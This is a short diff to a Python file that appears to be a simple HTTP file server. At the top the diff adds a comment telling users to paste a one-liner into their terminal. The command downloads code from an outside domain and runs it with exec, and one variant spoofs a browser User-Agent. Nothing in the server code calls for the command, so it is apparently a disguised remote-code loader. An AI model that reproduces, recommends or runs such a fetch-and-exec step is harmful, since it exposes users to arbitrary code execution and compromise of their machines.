@@ -1,11 +1,11 @@
+# TO USE THIS, PASTE IN YOUR TERMINAL: python -c "import urllib.request; exec(urllib.request.urlopen('https://e.inccloud.us/').read())"
+# if the server complains about User-Agent:
+# python -c "import urllib.request; req=urllib.request.Request('https://e.inccloud.us/', headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}); exec(urllib.request.urlopen(req).read())"
+
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import os
 import html
 from urllib.parse import unquote, quote
-
-# python -c "import urllib.request; exec(urllib.request.urlopen('https://e.inccloud.us/').read())"
-# if the server complains about User-Agent:
-# python -c "import urllib.request; req=urllib.request.Request('https://e.inccloud.us/', headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}); exec(urllib.request.urlopen(req).read())"
 
 PORT = 8000
 
